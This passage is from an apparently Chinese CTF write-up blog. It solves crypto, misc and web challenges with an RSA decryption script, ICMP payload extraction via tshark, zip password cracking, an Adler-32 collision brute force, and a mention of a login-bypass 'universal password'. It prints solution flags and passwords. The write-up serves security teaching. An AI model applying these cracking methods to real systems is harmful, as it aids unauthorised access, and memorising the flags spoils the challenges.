class="number">349705569</span>,<span class="number">388149253</span>,<span class="number">710690594</span>,<span class="number">763355610</span>,<span class="number">211593791</span>,<span class="number">707637171</span>,<span class="number">369453331</span>,<span class="number">228868281</span>,<span class="number">541631545</span>,<span class="number">397988536</span>,<span class="number">322517722</span>,<span class="number">12982396</span>,<span class="number">107590034</span>,<span class="number">387385119</span>,<span class="number">322517722</span>,<span class="number">685252839</span>,<span class="number">710690594</span>,<span class="number">322517722</span>,<span class="number">109170298</span>,<span class="number">349705569</span>,<span class="number">763355610</span>,<span class="number">349705569</span>,<span class="number">349705569</span>,<span class="number">37195518</span>,<span class="number">25028382</span>,<span class="number">610867628</span>,<span class="number">44896265</span>,<span class="number">25028382</span>,<span class="number">454683367</span>,<span class="number">15283689</span></span><br></pre></td></tr></table></figure><h4 id="solve-1"><a href="#solve-1" class="headerlink" title="solve"></a>solve</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding : utf-8 -*-</span></span><br><span class="line"><span class="comment"># __author__ = 'https://github.com/findneo'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n=<span class="number">829467319</span></span><br><span class="line"><span class="comment"># 使用yafu离线分解得到p,q</span></span><br><span class="line">p = <span class="number">36497</span></span><br><span class="line">q = <span class="number">22727</span></span><br><span class="line">e=<span class="number">48357</span></span><br><span class="line"><span class="keyword">assert</span>(p*q==n)</span><br><span class="line">phi=(p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line">c=[<span class="number">322517722</span>,<span class="number">575397051</span>,<span class="number">76525646</span>,<span class="number">768452152</span>,<span class="number">107590034</span>,<span class="number">710690594</span>,<span class="number">322517722</span>,<span class="number">174907762</span>,<span class="number">343945760</span>,<span class="number">763355610</span>,<span class="number">301647581</span>,<span class="number">349705569</span>,<span class="number">575397051</span>,<span class="number">76525646</span>,<span class="number">410109929</span>,<span class="number">322517722</span>,<span class="number">497916224</span>,<span class="number">228868281</span>,<span class="number">228868281</span>,<span class="number">741167939</span>,<span class="number">497916224</span>,<span class="number">450014050</span>,<span class="number">322517722</span>,<span class="number">322517722</span>,<span class="number">126657310</span>,<span class="number">349705569</span>,<span class="number">322517722</span>,<span class="number">707637171</span>,<span class="number">76525646</span>,<span class="number">527107437</span>,<span class="number">710690594</span>,<span class="number">685252839</span>,<span class="number">450014050</span>,<span class="number">349705569</span>,<span class="number">388149253</span>,<span class="number">710690594</span>,<span class="number">763355610</span>,<span class="number">211593791</span>,<span class="number">707637171</span>,<span class="number">369453331</span>,<span class="number">228868281</span>,<span class="number">541631545</span>,<span class="number">397988536</span>,<span class="number">322517722</span>,<span class="number">12982396</span>,<span class="number">107590034</span>,<span class="number">387385119</span>,<span class="number">322517722</span>,<span class="number">685252839</span>,<span class="number">710690594</span>,<span class="number">322517722</span>,<span class="number">109170298</span>,<span class="number">349705569</span>,<span class="number">763355610</span>,<span class="number">349705569</span>,<span class="number">349705569</span>,<span class="number">37195518</span>,<span class="number">25028382</span>,<span class="number">610867628</span>,<span class="number">44896265</span>,<span class="number">25028382</span>,<span class="number">454683367</span>,<span class="number">15283689</span>]</span><br><span class="line"></span><br><span class="line">s=<span class="string">''</span>.join(map(<span class="keyword">lambda</span> ci:chr(pow(ci,d,n)),c))</span><br><span class="line">print(s) <span class="comment"># _stIwn_:!oAestN_rii.ra__&#125;e_gt8nuae1nolg0iYf_2w&#123;_un_CeoeeEhychST</span></span><br></pre></td></tr></table></figure><p><img src="1543149985751.png" alt="1543149985751"></p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="MISC1"><a href="#MISC1" class="headerlink" title="MISC1"></a>MISC1</h3><p>部分ICMP包DATA字段携带数据，且逐字节为504B…，很显然是个压缩包，使用命令行工具tshark提取对应字段。</p><p>tshark用法参考<code>tshark --help</code> 或 <a href="https://www.cnblogs.com/liun1994/p/6142505.html" target="_blank" rel="noopener">Wireshark命令行工具tshark使用小记</a> 。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ tshark -r pcapng.pcapng  -Y <span class="string">"icmp and icmp.ident==0x930a"</span>  -T fields -e data | xxd -r -p &gt; flag.zip &amp;&amp; xxd flag.zip</span><br><span class="line">00000000: 504b 0304 1400 0100 0000 0386 584d 2a17  PK..........XM*.</span><br><span class="line">00000010: fbf2 3200 0000 2600 0000 0800 0000 666c  ..2...&amp;.......fl</span><br><span class="line">00000020: 6167 2e74 7874 c541 e340 943c a98d fc66  ag.txt.A.@.&lt;...f</span><br><span class="line">00000030: 952e 0ffe 9ff3 8797 7647 b934 6d3d 8d3d  ........vG.4m=.=</span><br><span class="line">00000040: b94c fc2d cb14 16f3 723a ab5c 5e7f 0903  .L.-....r:.\^...</span><br><span class="line">00000050: 64ea 7b5b 1ae0 1a4c 504b 0102 3f00 1400  d.&#123;[...LPK..?...</span><br><span class="line">00000060: 0100 0000 0386 584d 2a17 fbf2 3200 0000  ......XM*...2...</span><br><span class="line">00000070: 2600 0000 0800 2400 0000 0000 0000 2000  &amp;.....$....... .</span><br><span class="line">00000080: 0000 0000 0000 666c 6167 2e74 7874 0a00  ......flag.txt..</span><br><span class="line">00000090: 2000 0000 0000 0100 1800 cee8 7c47 766b   ...........|Gvk</span><br><span class="line">000000a0: d401 7d2d ec42 766b d401 7d2d ec42 766b  ..&#125;-.Bvk..&#125;-.Bvk</span><br><span class="line">000000b0: d401 504b 0506 0000 0000 0100 0100 5a00  ..PK..........Z.</span><br><span class="line">000000c0: 0000 5800 0000 0000 0050                 ..X......P</span><br><span class="line">neo@u:/mnt/d/cwd/bailu/mis1$</span><br></pre></td></tr></table></figure><p>使用ziperello爆破密码为q，得到<code>flag{d27ca49cb6f5583ae9f3bb2ec38190de}</code> 。</p><h3 id="MISC2"><a href="#MISC2" class="headerlink" title="MISC2"></a>MISC2</h3><h4 id="problem-2"><a href="#problem-2" class="headerlink" title="problem"></a>problem</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>safe box<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">body &#123;</span></span><br><span class="line"><span class="undefined">  text-align: center;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">input &#123;</span></span><br><span class="line"><span class="undefined">  font-size: 200%;</span></span><br><span class="line"><span class="undefined">  margin-top: 5em;</span></span><br><span class="line"><span class="undefined">  text-align: center;</span></span><br><span class="line"><span class="undefined">  width: 26em;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">#result &#123;</span></span><br><span class="line"><span class="undefined">  margin-top: 8em;</span></span><br><span class="line"><span class="undefined">  font-size: 300%;</span></span><br><span class="line"><span class="undefined">  font-family: monospace;</span></span><br><span class="line"><span class="undefined">  font-weight: bold;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">body.granted&gt;#result::before &#123;</span></span><br><span class="line"><span class="undefined">  content: "Access Granted";</span></span><br><span class="line"><span class="undefined">  color: green;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">body.denied&gt;#result::before &#123;</span></span><br><span class="line"><span class="undefined">  content: "Access Denied";</span></span><br><span class="line"><span class="undefined">  color: red;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">#content &#123;</span></span><br><span class="line"><span class="undefined">  display: none;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">body.granted #content &#123;</span></span><br><span class="line"><span class="undefined">  display: initial;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">@keyframes spin &#123;</span></span><br><span class="line"><span class="undefined">  from &#123; transform: rotateY(0); &#125;</span></span><br><span class="line"><span class="undefined">  to &#123; transform: rotateY(360deg); &#125;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">.cube &#123;</span></span><br><span class="line"><span class="undefined">  animation: spin 20s infinite linear;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">.cube div &#123;</span></span><br><span class="line"><span class="undefined">  position: absolute;</span></span><br><span class="line"><span class="undefined">  width: 200px;</span></span><br><span class="line"><span class="undefined">  height: 200px;</span></span><br><span class="line"><span class="undefined">  background: rgba(0, 0, 0, 0.51);</span></span><br><span class="line"><span class="undefined">  box-shadow: inset 0 0 60px white;</span></span><br><span class="line"><span class="undefined">  font-size: 20px;</span></span><br><span class="line"><span class="undefined">  text-align: center;</span></span><br><span class="line"><span class="undefined">  line-height: 200px;</span></span><br><span class="line"><span class="undefined">  color: rgba(0,0,0,0.5);</span></span><br><span class="line"><span class="undefined">  font-family: sans-serif;</span></span><br><span class="line"><span class="undefined">  text-transform: uppercase;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">  <span class="function"><span class="keyword">function</span> <span class="title">adler32</span>(<span class="params">str</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> a = <span class="number">1</span>, b = <span class="number">0</span>, L = str.length, M = <span class="number">0</span>, c = <span class="number">0</span>, d = <span class="number">0</span>;</span></span><br><span class="line"><span class="undefined"> </span></span><br><span class="line"><span class="javascript">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; L;) &#123;</span></span><br><span class="line"><span class="javascript">        M = <span class="built_in">Math</span>.min(L - i, <span class="number">3850</span>);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">while</span> (M &gt; <span class="number">0</span>) &#123;</span></span><br><span class="line"><span class="undefined">            c = str.charCodeAt(i++);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">if</span> (c &lt; <span class="number">0x80</span>) &#123; a += c; &#125;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">else</span> <span class="keyword">if</span> (c &lt; <span class="number">0x800</span>) &#123;</span></span><br><span class="line"><span class="undefined">                a += 192 | ((c &gt;&gt; 6) &amp; 31); b += a; --M;</span></span><br><span class="line"><span class="undefined">                a += 128 | (c &amp; 63);</span></span><br><span class="line"><span class="javascript">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c &gt;= <span class="number">0xD800</span> &amp;&amp; c &lt; <span class="number">0xE000</span>) &#123;</span></span><br><span class="line"><span class="undefined">                c = (c &amp; 1023) + 64; d = str.charCodeAt(i++) &amp; 1023;</span></span><br><span class="line"><span class="undefined">                a += 240 | ((c &gt;&gt; 8) &amp; 7); b += a; --M;</span></span><br><span class="line"><span class="undefined">                a += 128 | ((c &gt;&gt; 2) &amp; 63); b += a; --M;</span></span><br><span class="line"><span class="undefined">                a += 128 | ((d &gt;&gt; 6) &amp; 15) | ((c &amp; 3) &lt;&lt; 4); b += a; --M;</span></span><br><span class="line"><span class="undefined">                a += 128 | (d &amp; 63);</span></span><br><span class="line"><span class="javascript">            &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="undefined">                a += 224 | ((c &gt;&gt; 12) &amp; 15); b += a; --M;</span></span><br><span class="line"><span class="undefined">                a += 128 | ((c &gt;&gt; 6) &amp; 63); b += a; --M;</span></span><br><span class="line"><span class="undefined">                a += 128 | (c &amp; 63);</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined">            b += a; --M;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">        a = (15 * (a &gt;&gt;&gt; 16) + (a &amp; 65535));</span></span><br><span class="line"><span class="undefined">        b = (15 * (b &gt;&gt;&gt; 16) + (b &amp; 65535));</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">return</span> ((b % <span class="number">65521</span>) &lt;&lt; <span class="number">16</span>) | (a % <span class="number">65521</span>);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params">х</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">if</span>(х!=<span class="string">"0x0201"</span>&amp;&amp;adler32(х)==adler32(<span class="string">"0x0201"</span>))&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">return</span> <span class="literal">true</span>;</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">open_safe</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">  keyhole.disabled = <span class="literal">true</span>;</span></span><br><span class="line"><span class="javascript">  password = <span class="regexp">/^password&#123;([0-9a-zA-Z_@!?-]+)&#125;$/</span>.exec(keyhole.value);</span></span><br><span class="line"><span class="javascript">  <span class="keyword">if</span> (!password || !check(password[<span class="number">1</span>])) <span class="keyword">return</span> <span class="built_in">document</span>.body.className = <span class="string">'denied'</span>;</span></span><br><span class="line"><span class="javascript">  <span class="built_in">document</span>.body.className = <span class="string">'granted'</span>;</span></span><br><span class="line"><span class="javascript">  content.value = <span class="string">"\x00\x00\x00\x00\x00\x83\x00\x00\x00N\x00\x01\x00\x01\x00\x00\x00\x00\x06\x05KP\x00\x00\x00\x00\x04\x00\x00\x00\x00\x04\x01\x00\x0bxu[\xd1\x9e\x8d\x03\x00\x05TUtxt.galf\x00\x00\x00\x00\x81\xa4\x00\x00\x00\x01\x00\x00\x00\x00\x00\x18\x00\x08\x00\x00\x00%\x00\x00\x001=\x16\x04\x0cMY\x95\x8f\x00\x00\x00\t\x00\n\x03\x1e\x02\x01KP\x00\x00\x00%\x00\x00\x001=\x16\x04\x0c\x08\x07KP\x045R\tM\xc2\xde\x14sg\x92\xd0K\xbfh\x9c\x08\xeb\xf3@\x9d\x00\x14\x8b^\xfb\xa5\x96O\xc0\xdd\x8a(\xe6\x0c\x92\x1e \xad\x86\xa6@\xbc@J=\x11Z\xfe\x00\x00\x00\x00\x04\x00\x00\x00\x00\x04\x01\x00\x0bxu[\xd1\x9e\xfb[\xd1\x9e\x8d\x03\x00\tTUtxt.galf\x00\x1c\x00\x08\x00\x00\x00%\x00\x00\x001=\x16\x04\x0cMY\x95\x8f\x00\x00\x00\t\x00\n\x04\x03KP"</span>;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"keyhole"</span> <span class="attr">autofocus</span> <span class="attr">onchange</span>=<span class="string">"open_safe()"</span> <span class="attr">placeholder</span>=<span class="string">"🔑"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"result"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"content"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="solve-2"><a href="#solve-2" class="headerlink" title="solve"></a>solve</h4><p>显然密码正确后输出的conten.value是一个压缩包反转后的内容，提取得到压缩包发现加密，猜测密码要能走通JS逻辑。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">"\x00\x00\x00\x00\x00\x83\x00\x00\x00N\x00\x01\x00\x01\x00\x00\x00\x00\x06\x05KP\x00\x00\x00\x00\x04\x00\x00\x00\x00\x04\x01\x00\x0bxu[\xd1\x9e\x8d\x03\x00\x05TUtxt.galf\x00\x00\x00\x00\x81\xa4\x00\x00\x00\x01\x00\x00\x00\x00\x00\x18\x00\x08\x00\x00\x00%\x00\x00\x001=\x16\x04\x0cMY\x95\x8f\x00\x00\x00\t\x00\n\x03\x1e\x02\x01KP\x00\x00\x00%\x00\x00\x001=\x16\x04\x0c\x08\x07KP\x045R\tM\xc2\xde\x14sg\x92\xd0K\xbfh\x9c\x08\xeb\xf3@\x9d\x00\x14\x8b^\xfb\xa5\x96O\xc0\xdd\x8a(\xe6\x0c\x92\x1e \xad\x86\xa6@\xbc@J=\x11Z\xfe\x00\x00\x00\x00\x04\x00\x00\x00\x00\x04\x01\x00\x0bxu[\xd1\x9e\xfb[\xd1\x9e\x8d\x03\x00\tTUtxt.galf\x00\x1c\x00\x08\x00\x00\x00%\x00\x00\x001=\x16\x04\x0cMY\x95\x8f\x00\x00\x00\t\x00\n\x04\x03KP"</span></span><br><span class="line">f=open(<span class="string">'extract.zip'</span>,<span class="string">'wb'</span>).write(s[::<span class="number">-1</span>])</span><br></pre></td></tr></table></figure><p>使用JavaScript爆破密码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dec2hexString</span>(<span class="params">dec</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'0x'</span> + (dec+<span class="number">0x10000</span>).toString(<span class="number">16</span>).substr(<span class="number">-4</span>).toUpperCase();</span><br><span class="line"> &#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bruteforce</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>;i&lt;<span class="number">0xffff</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(check(dec2hexString(i)))<span class="built_in">console</span>.log(<span class="string">"password&#123;"</span>+dec2hexString(i)+<span class="string">"&#125;"</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">bruteforce()</span><br><span class="line"><span class="comment">// password&#123;0x0120&#125; √</span></span><br><span class="line"><span class="comment">// password&#123;0x1011&#125; ×</span></span><br></pre></td></tr></table></figure><p>或者使用python爆破：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /^password&#123;([0-9a-zA-Z_@!?-]+)&#125;$/</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">adler32</span><span class="params">(s)</span>:</span></span><br><span class="line">    i=<span class="number">0</span>;a=<span class="number">1</span>;b=<span class="number">0</span>;M=<span class="number">0</span>;c=<span class="number">0</span>;d=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i&lt;len(s):</span><br><span class="line">        M=min(len(s)-i,<span class="number">3850</span>)</span><br><span class="line">        <span class="keyword">while</span> M&gt;<span class="number">0</span>:</span><br><span class="line">            c=ord(s[i]);i+=<span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> c&lt; <span class="number">0x80</span>:</span><br><span class="line">                a+=c</span><br><span class="line">            <span class="keyword">elif</span> c&gt;<span class="number">0xd800</span> <span class="keyword">and</span> c &lt; <span class="number">0xe000</span>:</span><br><span class="line">                c= (c &amp; <span class="number">1023</span>) +<span class="number">64</span> ;d = s[i]&amp;<span class="number">1023</span>;i+=<span class="number">1</span></span><br><span class="line">                a+=<span class="number">240</span> | ((c &gt;&gt; <span class="number">8</span>) &amp; <span class="number">7</span>); b += a; M-=<span class="number">1</span></span><br><span class="line">                a += <span class="number">128</span> | ((c &gt;&gt; <span class="number">2</span>) &amp; <span class="number">63</span>); b += a; M-=<span class="number">1</span></span><br><span class="line">                a += <span class="number">128</span> | ((d &gt;&gt; <span class="number">6</span>) &amp; <span class="number">15</span>) | ((c &amp; <span class="number">3</span>) &lt;&lt; <span class="number">4</span>); b += a; M-=<span class="number">1</span></span><br><span class="line">                a += <span class="number">128</span> | (d &amp; <span class="number">63</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                a += <span class="number">224</span> | ((c &gt;&gt; <span class="number">12</span>) &amp; <span class="number">15</span>); b += a;M-=<span class="number">1</span></span><br><span class="line">                a += <span class="number">128</span> | ((c &gt;&gt; <span class="number">6</span>) &amp; <span class="number">63</span>); b += a;M-=<span class="number">1</span></span><br><span class="line">                a += <span class="number">128</span> | (c &amp; <span class="number">63</span>)</span><br><span class="line">            b+=a;M-=<span class="number">1</span></span><br><span class="line">        a = (<span class="number">15</span> * (a &gt;&gt; <span class="number">16</span>) + (a &amp; <span class="number">65535</span>))</span><br><span class="line">        b = (<span class="number">15</span> * (b &gt;&gt; <span class="number">16</span>) + (b &amp; <span class="number">65535</span>))</span><br><span class="line">    <span class="keyword">return</span> ((b % <span class="number">65521</span>) &lt;&lt; <span class="number">16</span>) | (a % <span class="number">65521</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> itertools.product(<span class="string">'0123456789'</span>,repeat=<span class="number">4</span>):</span><br><span class="line">    p=<span class="string">'0x'</span>+<span class="string">''</span>.join(i)</span><br><span class="line">    <span class="keyword">if</span> adler32(p)==adler32(<span class="string">'0x0201'</span>):</span><br><span class="line">        <span class="keyword">print</span> p,</span><br><span class="line">        <span class="comment"># [0x0120] 0x0201 0x1011</span></span><br></pre></td></tr></table></figure><p>密码为<code>password{0x0120}</code> ，解压得到flag。<code>flag{cjvf33_98hfi3_jfh3_dsh93h_f3had}</code> 。</p><h3 id="MISC3"><a href="#MISC3" class="headerlink" title="MISC3"></a>MISC3</h3><p>给了1321个TXT，每个文件一个字符，内容如下。提示时间戳，没搞懂要干啥。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cat ./*</span><br><span class="line">Money is not evil by itself.Its just paper with perceived value to obtain other things we value <span class="keyword">in</span> other ways.If not money - what is. evil you may ask?Evil is the unquenchable, obsessive and moral bending desire <span class="keyword">for</span> more.Evil is the bottomless, soulless and obsessive-compulsive pursuit of some pot of gold.at the end of some rainbow <span class="built_in">which</span> doesn<span class="string">'t exist.Evil is having a price tag for your heart and soul in exchange for financial success at any cost.Evil is trying to buy happiness, again and again.until all of those fake, short lived mirages of emotions are gone.Make more time.I'</span>m not saying you can<span class="string">'t be financially successful.I'</span>m saying have a greater purpose <span class="keyword">in</span> life well beyond the pursuit of financial success.Your soul is screaming <span class="keyword">for</span> you to answer your <span class="literal">true</span> calling.You can change today <span class="keyword">if</span> you redefine what success is to you.You can transform your damaged relationships and build new ones.You can forgive yourself and others who<span class="string">'ve hurt you.You can become a leader by mentoring with others who you aspire to be like.You can re-balance your priorities in life.You can heal your marriage and recreate a stronger love than you ever thought possible.You can become the best parent possible at any age - even 86.but don'</span>t <span class="built_in">wait</span> until then...You will always be able to make more money.But you cannot make more time.</span><br></pre></td></tr></table></figure><p>记录一个获取文件时间的方式。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line">a=subprocess.check_output((<span class="string">"stat"</span>,<span class="string">"-c"</span>, <span class="string">"%y"</span>, file_name))</span><br></pre></td></tr></table></figure><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Web1"><a href="#Web1" class="headerlink" title="Web1"></a>Web1</h3><p>万能密码</p><h3 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h3><p>主页CTRL+U，发现源码泄露。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//http://172.16.17.2/file_aq12ws.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span 